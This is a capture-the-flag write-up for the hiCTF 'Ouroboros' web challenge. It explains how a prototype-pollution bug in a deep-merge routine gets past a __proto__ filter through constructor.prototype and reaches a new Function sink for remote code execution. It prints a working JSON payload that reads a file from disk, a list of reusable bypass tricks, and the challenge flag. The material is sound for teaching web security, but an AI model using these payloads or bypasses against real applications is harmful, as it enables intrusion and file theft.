---
title: "Ouroboros"
ctf: "2026-hiCTF"
category: "web"
difficulty: "Not specified"
points: null
techniques: ["prototype-pollution", "ssti"]
tools: ["bash"]
keywords: ["Ouroboros", "hiCTF", "web", "prototype-pollution", "ssti", "bash", "https", "rce"]
status: "solved"
has_script: true
source: "hiCTF/Web/Ouroboros/notes.md"
---

# Ouroboros (hiCTF, web)

## Summary
Challenge **Ouroboros** from the hiCTF CTF, web category. Main technique: prototype-pollution. Report Builder: login, save a branding config (deep-merge), render a live preview (fixed server template). “no user templates, no eval, the one dangerous thing you're thinking of is already filtered”. Flag on disk, on no road.

## Statement and artefacts
Report Builder: login, save a branding config (deep-merge), render a live preview (fixed server template). “no user templates, no eval, the one dangerous thing you're thinking of is already filtered”. Flag on disk, on no road.

## Recognition signals
- Signal: Search for a sink that reads an inheritable property (here formula evaluated). A “computed/formula” field on the renderer side is a signal.

## Resolution method
1. **Operation chain (2 endpoints)**

1. **Login**: `POST /api/login {"username":"anyone"}` (no password) → cookie `sid`.
2. **Config**: `POST /api/report/config {"settings":{...}}` → **deep-merge** recursive in session config (`{theme, accent, watermark, footer}`).
3. **Preview**: `POST /api/report/preview {"data":{"title","body"}}` → renders a fixed template: `<section class="report"><h1>${title}</h1><small>${footer}</small><div class="body">${body}</div><div class="computed">${…}</div></section>`. `title`/`body`/`footer` are **escaped** (no direct SSTI — it’s “the one dangerous thing”… no, in the rest of the method).
4. **The `computed` div** is populated by **evaluating a `formula`** property via a **`new Function(formula)()` custom**. `formula` is NOT a normal config key → it is injected by **prototype pollution**.
5. **Filter bypass**: deep-merge **filters the `__proto__` key** (= “the one dangerous thing you're thinking of is already filtered”). **Ouroboros** = we return to the prototype by the other path: **`constructor.prototype`**.
   ```json
   {"settings":{"constructor":{"prototype":{"formula":"return process.mainModule.require('fs').readFileSync('/flag.txt','utf8')"}}}}
   ```
6. **RCE**: `formula` is executed as **function body** → `return 7*7` results in `49`. `process` is accessible (globals Node; `require` is not accessible in a `new Function`, hence `process.mainModule.require`). The result appears in `<div class="computed">`.
7. **Reading the flag**: `ls /` → `flag.txt` at the root → `readFileSync('/flag.txt')`.

2. **Key diagnosis (how we found it)**

- `__proto__` in the merge → filtered (no effect). `constructor.prototype` → **pass**.
- By polluting candidate property names, `formula` filled the `computed` div with **“formula error”** (the evaluator crashed on a non-code value) → sink identified.
- `"7*7"` → `undefined` (function body without `return`), **`"return 7*7"` → `49`** → confirms `new Function(body)()`.
- `"return typeof process"` → `object` → RCE confirmed.

3. **Solve**

`work/solve.sh`: login → pollution `constructor.prototype.formula` → preview, reads the result in the `computed` div.

## Solve script
Script path: `scripts/solve.sh`

## Flag
hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_1259ce2d45}

## Lessons and reusable patterns
- “deep-merge” in a statement = think prototype pollution. Ouroboros/recursion = the recursive merge + the return to the prototype.
- Filter __proto__ -> bypass constructor.prototype (and vice versa ['__proto__'], a.__proto__ according to the impl).
- Find a sink that reads an inheritable property (here formula evaluated). A “computed/formula” field on the renderer side is a signal.
- RCE gadget without eval: a new Function(userControlled)() is as good as eval. In a new Function, require is absent -> use process.mainModule.require (or process.binding, globalThis).
- Proof of fast execution: return 7*7 vs 7*7 (distinguishes “expression” from “function body”).
